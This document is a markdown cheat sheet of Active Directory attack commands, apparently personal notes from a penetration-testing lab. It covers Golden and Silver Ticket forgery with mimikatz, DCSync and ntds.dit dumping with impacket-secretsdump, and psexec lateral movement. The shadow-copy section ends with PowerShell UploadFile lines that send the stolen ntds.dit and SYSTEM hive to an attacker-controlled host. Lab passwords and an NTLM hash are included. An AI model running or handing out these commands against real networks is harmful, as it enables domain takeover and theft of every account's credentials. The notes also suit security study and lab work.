## Persistence

With krbtgt, We can create a Golden ticket.

### Links

- [LSA Dump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)


### Golden Ticket Attack

```
# Assuming that Victim account is member of Domain Admin or we have compromised the DC.
# Let's extract pass hash of krbtgt account with mimikatz.

mimikatz
privilege::debug
lsadump::lsa /patch # Look for User:krbtgt and it's NTLM Hash.

kerberos::purge
kerberos::golden /user:<TOPI> /domain:<domain_name> /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:<NTLM hash> /ptt
# This is allowed because DC trusts anything which is encrytped by krbtgt pass hash.

misc::cmd
psexec.exe \\dc01 cmd.exe # Lateral movement to DC.
whoami
whoami /groups
```

### DCSync Attack

```
DSync (Domain Controller Synchronization) -> Steal Pass hashes of all Admin Users in Domain.

Methods:
1) Laterally move to DC and run mimikatz to dump pass hash of every user.
2) Steal ntdis.dit from DC.
3) Above 2 requires tool upload and can get caught so we use 3rd method to abuse DC's functionality.
# Login with a Local admin priv account and run mimikatz.

mimikatz
lsadump::dcsync /user:Administrator # Administrator is target account.


impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.205.70

```

We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.


### Other Notes

### Silver Tickets
```
iwr -UseDefaultCredentials http://web04
privilege::debug
sekurlsa::logonpasswords

whoami /user

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit


klist
iwr -UseDefaultCredentials http://web04 | findstr /i OS{
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"



```

### Shadow Copies
```
*Shadow Copies*

vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL



powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\ntds.dit.bak')"


powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
```